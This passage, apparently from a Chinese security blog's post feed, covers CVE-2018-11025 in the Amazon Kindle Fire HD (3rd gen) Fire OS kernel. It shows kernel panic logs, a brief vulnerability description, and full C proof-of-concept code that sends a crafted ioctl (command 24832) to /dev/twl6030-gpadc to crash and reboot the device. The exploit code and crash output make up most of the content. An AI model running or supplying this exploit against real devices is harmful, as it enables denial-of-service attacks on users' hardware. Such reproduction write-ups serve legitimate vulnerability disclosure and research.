class="line">[   96.058990] Control: 10c5387d  Table: 96cb804a  DAC: 00000015</span><br><span class="line">[   96.065460] </span><br><span class="line">[   96.065460] PC: 0xc06a4d08:</span><br><span class="line">[   96.070404] 4d08  1a000003 eaffffe6 e5903000 e3530000 0affffe3 e5903004 e3530000 1afffff9</span><br><span class="line">[   96.080810] 4d28  eaffffdf e50b0018 ebfffbab e51b0018 eaffffed e1a0c00d e92dd800 e24cb004</span><br><span class="line">[   96.091217] 4d48  ebffffcf e89da800 e1a0c00d e92dd878 e24cb004 e1a0300d e3c34d7f e3c4403f</span><br><span class="line">[   96.101776] 4d68  e1a05000 e3a06001 e5943004 e2833001 e5843004 e10f0000 f10c0080 e1953f9f</span><br><span class="line">[   96.112335] 4d88  e3330000 01853f96 e3530000 0a000014 e121f000 e5943004 e2433001 e5843004</span><br><span class="line">[   96.122894] 4da8  e5943000 e3130002 1a000010 e5953004 e3530000 e5953000 05856004 e3530000</span><br><span class="line">[   96.133361] 4dc8  1a000003 eaffffe7 e5953000 e3530000 0affffe4 e5953004 e3530000 1afffff9</span><br><span class="line">[   96.143920] 4de8  eaffffe0 f57ff05f e5853004 e89da878 ebfffb79 eaffffec e1a0c00d e92dd800</span><br><span class="line">[   96.154479] </span><br><span class="line">[   96.154479] LR: 0xc06a4d90:</span><br><span class="line">[   96.159393] 4d90  e3530000 0a000014 e121f000 e5943004 e2433001 e5843004 e5943000 e3130002</span><br><span class="line">[   96.170013] 4db0  1a000010 e5953004 e3530000 e5953000 05856004 e3530000 1a000003 eaffffe7</span><br><span class="line">[   96.180603] 4dd0  e5953000 e3530000 0affffe4 e5953004 e3530000 1afffff9 eaffffe0 f57ff05f</span><br><span class="line">[   96.191070] 4df0  e5853004 e89da878 ebfffb79 eaffffec e1a0c00d e92dd800 e24cb004 ebffffcf</span><br><span class="line">[   96.201690] 4e10  e89da800 e1a0c00d e92dd800 e24cb004 ebfffff6 e89da800 e1a0c00d e92dd800</span><br><span class="line">[   96.212341] 4e30  e24cb004 ebfffff1 e89da800 e1a0c00d e92dd818 e24cb004 ebffffc0 e1a04000</span><br><span class="line">[   96.222808] 4e50  ebe6a978 e121f004 e89da818 e1a0c00d e92dd800 e24cb004 ebfffff3 e89da800</span><br><span class="line">[   96.233612] 4e70  e1a0c00d e92dd830 e24cb004 e24dd008 e1a0300d e3c34d7f e3c4403f e3a05001</span><br><span class="line">[   96.244262] </span><br><span class="line">[   96.244262] SP: 0xd02bfd58:</span><br><span class="line">[   96.249145] fd58  00000000 0000001d 00000004 d4736f80 d4737394 c06a4d84 20000093 ffffffff</span><br><span class="line">[   96.259948] fd78  d02bfdc4 00000001 d02bfdf4 d02bfd90 c06a5318 c0008370 20000013 00000082</span><br><span class="line">[   96.270660] fd98  00000001 00000001 d02be000 1a03e6f3 00000001 1a03e6ef 00000001 dd3eeca8</span><br><span class="line">[   96.281311] fdb8  00000000 d02bfdf4 d02bfdf8 d02bfdd8 c06a4e10 c06a4d88 20000093 ffffffff</span><br><span class="line">[   96.292053] fdd8  0000020a 00000082 1a03e6f3 d02be000 d02bfe04 d02bfdf8 c06a4e10 c06a4d5c</span><br><span class="line">[   96.302825] fdf8  d02bfe14 d02bfe08 c06a4e24 c06a4e0c d02bfe5c d02bfe18 c06a3008 c06a4e20</span><br><span class="line">[   96.313415] fe18  d84a38d8 d84a2800 d84a3800 0000000a d02be000 c33a3180 d02bfe54 1a03e6ef</span><br><span class="line">[   96.323883] fe38  bed24608 d02be000 d627f000 bed24608 dd3eeca8 00000000 d02bfe6c d02bfe60</span><br><span class="line">[   96.334533] </span><br><span class="line">[   96.334533] IP: 0xd02bfd78:</span><br><span class="line">[   96.339416] fd78  d02bfdc4 00000001 d02bfdf4 d02bfd90 c06a5318 c0008370 20000013 00000082</span><br><span class="line">[   96.349853] fd98  00000001 00000001 d02be000 1a03e6f3 00000001 1a03e6ef 00000001 dd3eeca8</span><br><span class="line">[   96.360290] fdb8  00000000 d02bfdf4 d02bfdf8 d02bfdd8 c06a4e10 c06a4d88 20000093 ffffffff</span><br><span class="line">[   96.370727] fdd8  0000020a 00000082 1a03e6f3 d02be000 d02bfe04 d02bfdf8 c06a4e10 c06a4d5c</span><br><span class="line">[   96.381042] fdf8  d02bfe14 d02bfe08 c06a4e24 c06a4e0c d02bfe5c d02bfe18 c06a3008 c06a4e20</span><br><span class="line">[   96.391479] fe18  d84a38d8 d84a2800 d84a3800 0000000a d02be000 c33a3180 d02bfe54 1a03e6ef</span><br><span class="line">[   96.402008] fe38  bed24608 d02be000 d627f000 bed24608 dd3eeca8 00000000 d02bfe6c d02bfe60</span><br><span class="line">[   96.412445] fe58  c06a319c c06a2fec d02bff04 d02bfe70 c0317c28 c06a3194 00000001 00000028</span><br><span class="line">[   96.422790] </span><br><span class="line">[   96.422790] FP: 0xd02bfd74:</span><br><span class="line">[   96.427795] fd74  ffffffff d02bfdc4 00000001 d02bfdf4 d02bfd90 c06a5318 c0008370 20000013</span><br><span class="line">[   96.438140] fd94  00000082 00000001 00000001 d02be000 1a03e6f3 00000001 1a03e6ef 00000001</span><br><span class="line">[   96.448699] fdb4  dd3eeca8 00000000 d02bfdf4 d02bfdf8 d02bfdd8 c06a4e10 c06a4d88 20000093</span><br><span class="line">[   96.459289] fdd4  ffffffff 0000020a 00000082 1a03e6f3 d02be000 d02bfe04 d02bfdf8 c06a4e10</span><br><span class="line">[   96.470031] fdf4  c06a4d5c d02bfe14 d02bfe08 c06a4e24 c06a4e0c d02bfe5c d02bfe18 c06a3008</span><br><span class="line">[   96.480438] fe14  c06a4e20 d84a38d8 d84a2800 d84a3800 0000000a d02be000 c33a3180 d02bfe54</span><br><span class="line">[   96.490875] fe34  1a03e6ef bed24608 d02be000 d627f000 bed24608 dd3eeca8 00000000 d02bfe6c</span><br><span class="line">[   96.501495] fe54  d02bfe60 c06a319c c06a2fec d02bff04 d02bfe70 c0317c28 c06a3194 00000001</span><br><span class="line">[   96.512023] </span><br><span class="line">[   96.512023] R4: 0xd02bdf80:</span><br><span class="line">[   96.517089] df80  000003ef 61ef22a8 61ef2278 61ef22d8 00000036 c0013e08 00000000 d02bdfa8</span><br><span class="line">[   96.527679] dfa0  c0013c60 c0136578 61ef22a8 61ef2278 0000000a c0186201 65490ce8 65490ce0</span><br><span class="line">[   96.538208] dfc0  61ef22a8 61ef2278 61ef22d8 00000036 00000001 65393000 6253ab8c 4010f2ec</span><br><span class="line">[   96.548797] dfe0  00000001 65490cd0 400f0273 400e3804 600f0010 0000000a 5788f1b0 0000000b</span><br><span class="line">[   96.559356] e000  00000002 00000003 00000000 d4736f80 c0a0e840 00000000 00000015 c4fcf880</span><br><span class="line">[   96.569885] e020  00000000 d02be000 c09ddc50 d4736f80 dd0be600 c1617b40 d02bfdf4 d02bfd40</span><br><span class="line">[   96.580535] e040  c06a36e4 00000000 00000000 00000000 00000000 00000000 01000000 00000000</span><br><span class="line">[   96.591125] e060  005bc4c0 5ebfea7f 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[   96.601684] </span><br><span class="line">[   96.601684] R9: 0xdd3eec28:</span><br><span class="line">[   96.606628] ec28  dd3eec28 dd3eec28 00000000 00000000 00000000 c06bc674 000200da c09dda58</span><br><span class="line">[   96.617218] ec48  00000000 00000000 dd3eec50 dd3eec50 00000000 c0aa5174 c0aa5174 c0aa5148</span><br><span class="line">[   96.627716] ec68  5aefd4d7 00000000 00000000 00000000 dd3eec80 00000000 00000000 00000000</span><br><span class="line">[   96.638275] ec88  00200000 00000000 00000000 dd3eec94 dd3eec94 dd3d6fc0 dd3d6fc0 00000000</span><br><span class="line">[   96.648864] eca8  000521a4 000003e8 000003e8 00000000 00000000 00000000 c06b9600 dd150400</span><br><span class="line">[   96.659423] ecc8  dd3eed80 dd33ae70 00001064 00000001 0fb00000 5aefd4d7 2d2b4d15 5aefd4d7</span><br><span class="line">[   96.669921] ece8  2d2b4d15 5aefd4d7 2d2b4d15 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[   96.680572] ed08  00000000 00000000 00000000 00000000 00000001 00000000 00000000 dd3eed24</span><br><span class="line">[   96.691162] Process gcioctl_poc_3 (pid: 3395, stack limit &#x3D; 0xd02be2f8)</span><br><span class="line">[   96.698455] Stack: (0xd02bfdd8 to 0xd02c0000)</span><br><span class="line">[   96.703430] fdc0:                                                       0000020a 00000082</span><br><span class="line">[   96.712554] fde0: 1a03e6f3 d02be000 d02bfe04 d02bfdf8 c06a4e10 c06a4d5c d02bfe14 d02bfe08</span><br><span class="line">[   96.721588] fe00: c06a4e24 c06a4e0c d02bfe5c d02bfe18 c06a3008 c06a4e20 d84a38d8 d84a2800</span><br><span class="line">[   96.730743] fe20: d84a3800 0000000a d02be000 c33a3180 d02bfe54 1a03e6ef bed24608 d02be000</span><br><span class="line">[   96.739837] fe40: d627f000 bed24608 dd3eeca8 00000000 d02bfe6c d02bfe60 c06a319c c06a2fec</span><br><span class="line">[   96.748840] fe60: d02bff04 d02bfe70 c0317c28 c06a3194 00000001 00000028 000fffff d02bfea0</span><br><span class="line">[   96.757934] fe80: d02bfedc d02bfe90 c0207454 c00bd920 0000001e c33a3180 d02bfed4 d02bfea8</span><br><span class="line">[   96.767059] fea0: 244085aa 1a03e6ef 000003f4 00000000 00000000 00000001 00000000 d02bff14</span><br><span class="line">[   96.776214] fec0: 00000000 00000001 dd3eeca8 c24d8a00 d02bfefc d02bfee0 c02089fc 00000000</span><br><span class="line">[   96.785247] fee0: d627f000 00000004 d627f000 bed24608 dd3eeca8 00000000 d02bff74 d02bff08</span><br><span class="line">[   96.794403] ff00: c0136044 c0317448 00000000 00000000 00000000 00000001 00000000 dd045190</span><br><span class="line">[   96.803649] ff20: dcf8c770 d02bff0c d02be000 bed24638 bed24608 c0145d9f d627f000 00000004</span><br><span class="line">[   96.812744] ff40: d02be000 00000000 d02bff64 00000000 bed24608 c0145d9f d627f000 00000004</span><br><span class="line">[   96.821746] ff60: d02be000 00000000 d02bffa4 d02bff78 c01365e0 c0135fc4 00000000 00000000</span><br><span class="line">[   96.830932] ff80: 00000400 bed24638 00010e54 00000000 00000036 c0013e08 00000000 d02bffa8</span><br><span class="line">[   96.840118] ffa0: c0013c60 c0136578 bed24638 00010e54 00000004 c0145d9f bed24608 bed24608</span><br><span class="line">[   96.849121] ffc0: bed24638 00010e54 00000000 00000036 00000000 00000000 00000000 bed24624</span><br><span class="line">[   96.858245] ffe0: 00000000 bed245ec 00010690 0002917c 60000010 00000004 006f0063 002e006d</span><br><span class="line">[   96.867340] Backtrace: </span><br><span class="line">[   96.870330] [&lt;c06a4d50&gt;] (__raw_spin_lock_irqsave+0x0&#x2F;0xb0) from [&lt;c06a4e10&gt;] (_raw_spin_lock_irqsave+0x10&#x2F;0x14)</span><br><span class="line">[   96.881591]  r6:d02be000 r5:1a03e6f3 r4:00000082 r3:0000020a</span><br><span class="line">[   96.888488] [&lt;c06a4e00&gt;] (_raw_spin_lock_irqsave+0x0&#x2F;0x14) from [&lt;c06a4e24&gt;] (_raw_spin_lock_irq+0x10&#x2F;0x14)</span><br><span class="line">[   96.899291] [&lt;c06a4e14&gt;] (_raw_spin_lock_irq+0x0&#x2F;0x14) from [&lt;c06a3008&gt;] (wait_for_common+0x28&#x2F;0x150)</span><br><span class="line">[   96.909729] [&lt;c06a2fe0&gt;] (wait_for_common+0x0&#x2F;0x150) from [&lt;c06a319c&gt;] (wait_for_completion_interruptible_timeout+0x14&#x2F;0x18)</span><br><span class="line">[   96.922149] [&lt;c06a3188&gt;] (wait_for_completion_interruptible_timeout+0x0&#x2F;0x18) from [&lt;c0317c28&gt;] (dev_ioctl+0x7ec&#x2F;0x10c4)</span><br><span class="line">[   96.934204] [&lt;c031743c&gt;] (dev_ioctl+0x0&#x2F;0x10c4) from [&lt;c0136044&gt;] (do_vfs_ioctl+0x8c&#x2F;0x5b4)</span><br><span class="line">[   96.943481] [&lt;c0135fb8&gt;] (do_vfs_ioctl+0x0&#x2F;0x5b4) from [&lt;c01365e0&gt;] (sys_ioctl+0x74&#x2F;0x84)</span><br><span class="line">[   96.952636] [&lt;c013656c&gt;] (sys_ioctl+0x0&#x2F;0x84) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0&#x2F;0x30)</span><br><span class="line">[   96.961822]  r8:c0013e08 r7:00000036 r6:00000000 r5:00010e54 r4:bed24638</span><br><span class="line">[   96.970153] Code: e5843004 e10f0000 f10c0080 e1953f9f (e3330000) </span><br><span class="line">[   96.977264] Board Information: </span><br><span class="line">[   96.977264]  Revision : 0001</span><br><span class="line">[   96.977294]  Serial	: 0000000000000000</span><br><span class="line">[   96.977294] SoC Information:</span><br><span class="line">[   96.977294]  CPU	: OMAP4470</span><br><span class="line">[   96.977294]  Rev	: ES1.0</span><br><span class="line">[   96.977325]  Type	: HS</span><br><span class="line">[   96.977325]  Production ID: 0002B975-000000CC</span><br><span class="line">[   96.977325]  Die ID	: 1CC60000-50002FFF-0B00935D-11007004</span><br><span class="line">[   96.977355] </span><br><span class="line">[   97.013824] ---[ end trace 2432291f2b5d99ba ]---</span><br><span class="line">[   97.019195] Kernel panic - not syncing: Fatal exception</span><br><span class="line">[   97.025024] CPU1: stopping</span><br><span class="line">[   97.028137] Backtrace: </span><br><span class="line">[   97.031311] [&lt;c0018148&gt;] (dump_backtrace+0x0&#x2F;0x10c) from [&lt;c0698bb8&gt;] (dump_stack+0x18&#x2F;0x1c)</span><br><span class="line">[   97.040679]  r6:c09ddc50 r5:c09dc844 r4:00000001 r3:c0a0e950</span><br><span class="line">[   97.047668] [&lt;c0698ba0&gt;] (dump_stack+0x0&#x2F;0x1c) from [&lt;c0019bd8&gt;] (handle_IPI+0x190&#x2F;0x1c4)</span><br><span class="line">[   97.056884] [&lt;c0019a48&gt;] (handle_IPI+0x0&#x2F;0x1c4) from [&lt;c00084fc&gt;] (gic_handle_irq+0x58&#x2F;0x60)</span><br><span class="line">[   97.066253] [&lt;c00084a4&gt;] (gic_handle_irq+0x0&#x2F;0x60) from [&lt;c06a5380&gt;] (__irq_svc+0x40&#x2F;0x70)</span><br><span class="line">[   97.075561] Exception stack(0xd6cb7d28 to 0xd6cb7d70)</span><br><span class="line">[   97.081237] 7d20:                   c1620b40 c3152ac0 d799dc70 00000000 00000000 c1620b40</span><br><span class="line">[   97.090454] 7d40: d6cb6000 c4eaaf80 00000001 c4eaaf80 c1620b40 d6cb7d7c d6cb7d80 d6cb7d70</span><br><span class="line">[   97.099670] 7d60: c0074004 c06a4880 60070013 ffffffff</span><br><span class="line">[   97.105346]  r6:ffffffff r5:60070013 r4:c06a4880 r3:c0074004</span><br><span class="line">[   97.112487] [&lt;c06a485c&gt;] (_raw_spin_unlock_irq+0x0&#x2F;0x50) from [&lt;c0074004&gt;] (finish_task_switch+0x58&#x2F;0x12c)</span><br><span class="line">[   97.123321] [&lt;c0073fac&gt;] (finish_task_switch+0x0&#x2F;0x12c) from [&lt;c06a36fc&gt;] (__schedule+0x3ec&#x2F;0x830)</span><br><span class="line">[   97.133239]  r8:c3152ac0 r7:c09ddc50 r6:d6cb6000 r5:c09b6b40 r4:c4fcf340</span><br><span class="line">[   97.141143] r3:00000001</span><br><span class="line">[   97.144500] [&lt;c06a3310&gt;] (__schedule+0x0&#x2F;0x830) from [&lt;c06a3c24&gt;] (preempt_schedule+0x40&#x2F;0x5c)</span><br><span class="line">[   97.154174] [&lt;c06a3be4&gt;] (preempt_schedule+0x0&#x2F;0x5c) from [&lt;c06a4808&gt;] (_raw_spin_unlock+0x48&#x2F;0x4c)</span><br><span class="line">[   97.164337]  r4:c0a7375c r3:00000002</span><br><span class="line">[   97.168731] [&lt;c06a47c0&gt;] (_raw_spin_unlock+0x0&#x2F;0x4c) from [&lt;c00983d0&gt;] (futex_wake+0xfc&#x2F;0x130)</span><br><span class="line">[   97.178436] [&lt;c00982d4&gt;] (futex_wake+0x0&#x2F;0x130) from [&lt;c0099868&gt;] (do_futex+0xf8&#x2F;0x9e8)</span><br><span class="line">[   97.187469] [&lt;c0099770&gt;] (do_futex+0x0&#x2F;0x9e8) from [&lt;c009a1ec&gt;] (sys_futex+0x94&#x2F;0x178)</span><br><span class="line">[   97.196289] [&lt;c009a158&gt;] (sys_futex+0x0&#x2F;0x178) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0&#x2F;0x30)</span><br><span class="line">[   97.205871] CPU0 PC (0) : 0xc003ee38</span><br><span class="line">[   97.209930] CPU0 PC (1) : 0xc003ee54</span><br><span class="line">[   97.214111] CPU0 PC (2) : 0xc003ee54</span><br><span class="line">[   97.218170] CPU0 PC (3) : 0xc003ee54</span><br><span class="line">[   97.222229] CPU0 PC (4) : 0xc003ee54</span><br><span class="line">[   97.226409] CPU0 PC (5) : 0xc003ee54</span><br><span class="line">[   97.230468] CPU0 PC (6) : 0xc003ee54</span><br><span class="line">[   97.234527] CPU0 PC (7) : 0xc003ee54</span><br><span class="line">[   97.238739] CPU0 PC (8) : 0xc003ee54</span><br><span class="line">[   97.242767] CPU0 PC (9) : 0xc003ee54</span><br><span class="line">[   97.246826] CPU1 PC (0) : 0xc0019b2c</span><br><span class="line">[   97.251007] CPU1 PC (1) : 0xc0019b2c</span><br><span class="line">[   97.255065] CPU1 PC (2) : 0xc0019b2c</span><br><span class="line">[   97.259124] CPU1 PC (3) : 0xc0019b2c</span><br><span class="line">[   97.263183] CPU1 PC (4) : 0xc0019b2c</span><br><span class="line">[   97.267364] CPU1 PC (5) : 0xc0019b2c</span><br><span class="line">[   97.271423] CPU1 PC (6) : 0xc0019b2c</span><br><span class="line">[   97.275482] CPU1 PC (7) : 0xc0019b2c</span><br><span class="line">[   97.279693] CPU1 PC (8) : 0xc0019b2c</span><br><span class="line">[   97.283752] CPU1 PC (9) : 0xc0019b2c</span><br><span class="line">[   97.287811] </span><br><span class="line">[   97.289581] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017</span><br><span class="line">[   97.289611] </span><br></pre></td></tr></table></figure>
</blockquote>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>Amazon</tag>
      </tags>
  </entry>
  <entry>
    <title>（CVE-2018-11025）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞</title>
    <url>/2020/09/12/IOT/Exploit/Amazon%20Kindle%20Fire%20HD(3rd)/%EF%BC%88CVE-2018-11025%EF%BC%89Amazon-Kindle-Fire-HD-3rd-Fire-OS-kernel%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><blockquote>
<p>Amazon Kindle Fire HD（3rd）Fire OS 4.5.5.3内核组件中的内核模块/omap/drivers/mfd/twl6030-gpadc.c允许攻击者通过设备/ dev / twl6030上的ioctl的参数注入特制的参数-gpadc命令<strong>24832</strong>并导致内核崩溃。</p>
<p>要探索此漏洞，必须打开设备文件/ dev / twl6030-gpadc，并使用命令<strong>24832</strong>和精心设计的有效负载作为第三个参数在此设备文件上调用ioctl系统调用。</p>
</blockquote>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Fire OS 4.5.5.3</p>
<a id="more"></a>

<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>poc</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is poc of Kindle Fire HD 3rd</span></span><br><span class="line"><span class="comment"> * A bug in the ioctl interface of device file /dev/twl6030-gpadc causes </span></span><br><span class="line"><span class="comment"> * the system crash via IOCTL 24832. </span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This Poc should run with permission to do ioctl on /dev/twl6030-gpadc.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">char</span> *driver = <span class="string">&quot;/dev/twl6030-gpadc&quot;</span>;</span><br><span class="line"><span class="keyword">static</span> command = <span class="number">24832</span>; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">twl6030_gpadc_user_parms</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> channel;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> result;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **env)</span> </span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">twl6030_gpadc_user_parms</span> <span class="title">payload</span>;</span></span><br><span class="line">        payload.channel = <span class="number">0x9b2a9212</span>;</span><br><span class="line">        payload.status = <span class="number">0x0</span>;</span><br><span class="line">        payload.result = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd = <span class="number">0</span>;</span><br><span class="line">        fd = open(driver, O_RDWR);</span><br><span class="line">        <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Failed to open %s, with errno %d\n&quot;</span>, driver, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 1 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Try ioctl device file &#x27;%s&#x27;, with command 0x%x and payload NULL\n&quot;</span>, driver, command);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;System will crash and reboot.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(ioctl(fd, command, &amp;payload) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Allocation of structs failed, %d\n&quot;</span>, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 2 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="崩溃日志"><a href="#崩溃日志" class="headerlink" title="崩溃日志"></a>崩溃日志</h2><blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[18460.321624] Unable to handle kernel paging request at virtual address 4b3f25fc</span><br><span class="line">[18460.330139] pgd &#x3D; ca210000</span><br><span class="line">[18460.333251] [4b3f25fc] *pgd&#x3D;00000000</span><br><span class="line">[18460.337768] Internal error: Oops: 5 [#1] PREEMPT SMP ARM</span><br><span class="line">[18460.343810] Modules linked in: omaplfb(O) pvrsrvkm(O) pvr_logger(O)</span><br><span class="line">[18460.351440] CPU: 0    Tainted: G           O  (3.4.83-gd2afc0bae69 #1)</span><br><span class="line">[18460.358825] PC is at twl6030_gpadc_ioctl+0x160&#x2F;0x180</span><br><span class="line">[18460.364379] LR is at twl6030_gpadc_conversion+0x5c&#x2F;0x484</span><br><span class="line">[18460.370452] pc : [&lt;c031b080&gt;]    lr : [&lt;c031a950&gt;]    psr: 60030013</span><br><span class="line">[18460.370452] sp : de94dd90  ip : 00000000  fp : de94df04</span><br><span class="line">[18460.383422] r10: 00000000  r9 : dcccf608  r8 : bea875ec</span><br><span class="line">[18460.389282] r7 : de94c000  r6 : 00000000  r5 : 00006100  r4 : bea875ec</span><br><span class="line">[18460.396697] r3 : fffffeb4  r2 : 4b3f2730  r1 : de94dee8  r0 : 00000001</span><br><span class="line">[18460.404113] Flags: nZCv  IRQs on  FIQs on  Mode SVC_32  ISA ARM  Segment user</span><br><span class="line">[18460.412048] Control: 10c5387d  Table: 8a21004a  DAC: 00000015</span><br><span class="line">[18460.418609] </span><br><span class="line">[18460.418609] PC: 0xc031b000:</span><br><span class="line">[18460.423583] b000  e24b101c e30f3eb4 e34f3fff e0822082 e0812102 e51220e4 e18120b3 e5973008</span><br><span class="line">[18460.434234] b020  e294200c 30d22003 33a03000 e3530000 0a000006 e3e0000c e24bd01c e89da8f0</span><br><span class="line">[18460.444885] b040  e24b0e17 e3a0100c ebfcf5c4 eafffff8 e1a00004 e24b1e17 e3a0200c ebfced7f</span><br><span class="line">[18460.455444] b060  e3500000 0afffff3 eafffff1 e51b2170 e24b101c e30f3eb4 e34f3fff e0812102</span><br><span class="line">[18460.465972] b080  e5122134 e18120b3 eaffffe3 03e0303c 150b016c 050b316c eaffffdf c0acabbc</span><br><span class="line">[18460.476623] b0a0  e1a0c00d e92dd800 e24cb004 e59030e0 e3530000 159000ec 03e00012 e89da800</span><br><span class="line">[18460.487182] b0c0  e1a0c00d e92dd800 e24cb004 e59000f0 e89da800 e1a0c00d e92dd800 e24cb004</span><br><span class="line">[18460.497863] b0e0  e5d020e9 e5d030e8 e1820003 e2000003 e89da800 e1a0c00d e92dd800 e24cb004</span><br><span class="line">[18460.508544] </span><br><span class="line">[18460.508544] LR: 0xc031a8d0:</span><br><span class="line">[18460.513519] a8d0  e89da878 e1a00004 ebffff20 e2000003 e3500002 13e0000a 03a00000 e89da878</span><br><span class="line">[18460.524078] a8f0  c09ba0c0 e1a0c00d e92ddff0 e24cb004 e24dd014 e2509000 0a000114 e59f5454</span><br><span class="line">[18460.534759] a910  e595008c e3500000 0a00010b e2800004 eb0e1ff0 e1d910b6 e3510001 9a00000a</span><br><span class="line">[18460.545318] a930  e595308c e3e06015 e59f142c e5930000 ebff4e6b e595a08c e28a0004 eb0e1f69</span><br><span class="line">[18460.555999] a950  e1a00006 e24bd028 e89daff0 e595a08c e3a03f52 e023a193 e5933038 e3530000</span><br><span class="line">[18460.566680] a970  13e0600f 1afffff3 e59a32c4 e0818101 e595c088 e3130010 e08c7008 1a000025</span><br><span class="line">[18460.577331] a990  e3510000 0a0000c4 e1d930b8 e3530001 0a0000d7 e1d940b6 e3540000 0a0000bc</span><br><span class="line">[18460.587890] a9b0  e3a0000e e3a01002 e3a02090 e5956088 ebfff8bc e3540001 0a0000d1 e1d920b6</span><br><span class="line">[18460.598571] </span><br><span class="line">[18460.598571] SP: 0xde94dd10:</span><br><span class="line">[18460.603546] dd10  00000000 0000000d de94dda0 10624dd3 de94dd4c c031b080 60030013 ffffffff</span><br><span class="line">[18460.614196] dd30  de94dd7c bea875ec de94df04 de94dd48 c06a5318 c0008370 00000001 de94dee8</span><br><span class="line">[18460.624877] dd50  4b3f2730 fffffeb4 bea875ec 00006100 00000000 de94c000 bea875ec dcccf608</span><br><span class="line">[18460.635528] dd70  00000000 de94df04 00000000 de94dd90 c031a950 c031b080 60030013 ffffffff</span><br><span class="line">[18460.646087] dd90  de94ddac 9b2a9212 00000000 00000000 00040000 0001f8fc 00000000 00000000</span><br><span class="line">[18460.656738] ddb0  c00795a0 00000001 de94ddd4 de94ddc8 c00795b4 c00792bc de94de0c de94ddd8</span><br><span class="line">[18460.667419] ddd0  c0070df8 c00795ac de94c000 00000001 00000004 dd32f8f4 60000013 00000001</span><br><span class="line">[18460.678100] ddf0  00000001 00000004 dd32f800 00000000 00000000 de94de10 c00723a0 c06a4818</span><br><span class="line">[18460.688629] </span><br><span class="line">[18460.688659] FP: 0xde94de84:</span><br><span class="line">[18460.693725] de84  de94de90 c0207454 c00bd920 0000001e c26fda80 de94ded4 de94dea8 c00723a0</span><br><span class="line">[18460.704284] dea4  000fffff 00000000 ffffffff 00000002 00000001 00000000 de94df14 00000000</span><br><span class="line">[18460.714935] dec4  00000001 dcccf608 cfa9bf00 de94defc de94dee0 c02089fc 00000000 00000000</span><br><span class="line">[18460.725616] dee4  00000000 00000000 d683fb40 00000004 d683fb40 de94df74 de94df08 c0136044</span><br><span class="line">[18460.736328] df04  c031af2c 00000000 00000000 00000000 00000001 00000000 dd188490 d8f925d8</span><br><span class="line">[18460.746856] df24  de94df0c de94c000 bea87618 bea875ec 00006100 d683fb40 00000004 de94c000</span><br><span class="line">[18460.757537] df44  00000000 de94df64 00000000 bea875ec 00006100 d683fb40 00000004 de94c000</span><br><span class="line">[18460.768096] df64  00000000 de94dfa4 de94df78 c01365e0 c0135fc4 00000000 00000000 00000400</span><br><span class="line">[18460.778625] </span><br><span class="line">[18460.778625] R1: 0xde94de68:</span><br><span class="line">[18460.783721] de68  c2572140 de94debc 00000001 00000028 000fffff 00000001 de94dedc de94de90</span><br><span class="line">[18460.794403] de88  c0207454 c00bd920 0000001e c26fda80 de94ded4 de94dea8 c00723a0 000fffff</span><br><span class="line">[18460.804962] dea8  00000000 ffffffff 00000002 00000001 00000000 de94df14 00000000 00000001</span><br><span 